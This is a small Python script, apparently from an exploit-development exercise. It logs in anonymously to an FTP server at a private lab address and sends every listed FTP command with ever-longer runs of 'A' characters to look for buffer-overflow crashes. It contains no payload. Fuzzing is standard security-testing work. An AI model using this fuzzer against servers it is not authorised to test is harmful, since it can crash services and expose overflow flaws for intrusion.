#!/usr/bin/python

import socket,time

buffer = ['A']
contador = 100

while len(buffer) <= 25:
	buffer.append('A' * contador)
	contador = contador + 200
#	contador += 200

#commands = ['!','dir','mdelete','qc','site','$','disconnect','mdir','sendport','size','account','exit','mget','put','status','append','form','mkdir','pwd','struct','ascii','get','mls','quit','system','bell','glob','mode','quote','sunique','binary','hash','modtime','recv','tenex','bye','help','mput','reget','tick','case','idle','newer','rstatus','trace','cd','image','nmap','rhelp','type','cdup','ipany','nlist','rename','user','chmod','ipv4','ntrans','reset','umask','close','ipv6','open','restart','verbose','cr','lcd','prompt','rmdir','?','delete','ls','passive','runique','debug','macdef','proxy','send']

#Conectando o socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
time.sleep(2)
s.connect(('192.168.0.62',21))
s.send('USER anonymous\r\n')
s.send('PASS anonymous\r\n')

#comandos de um servidor FTP
commands = ['!','DIR','MDELETE','QC','SITE','$','DISCONNECT','MDIR','SENDPORT','SIZE','ACCOUNT','MGET','PUT','STATUS','APPEND','FORM','MKDIR','PWD','STRUCT','ASCII','GET','MLS','SYSTEM','BELL','GLOB','MODE','QUOTE','SUNIQUE','BINARY','HASH','MODTIME','RECV','TENEX','BYE','HELP','MPUT','REGET','TICK','CASE','IDLE','NEWER','RSTATUS','TRACE','CD','IMAGE','NMAP','RHELP','TYPE','CDUP','IPANY','NLIST','RENAME','USER','CHMOD','IPV4','NTRANS','RESET','UMASK','CLOSE','IPV6','OPEN','RESTART','VERBOSE','CR','LCD','PROMPT','RMDIR','?','DELETE','LS','PASSIVE','RUNIQUE','DEBUG','MACDEF','PROXY','SEND','QUIT','EXIT']

for command in commands:
	for string in buffer:
		time.sleep(2)
		print 'Fuzzing FTP command %s %s bytes' % (command,len(string))
		s.send('%s %s\r\n' % (command,string))

#Fecha a conexao
s.close()
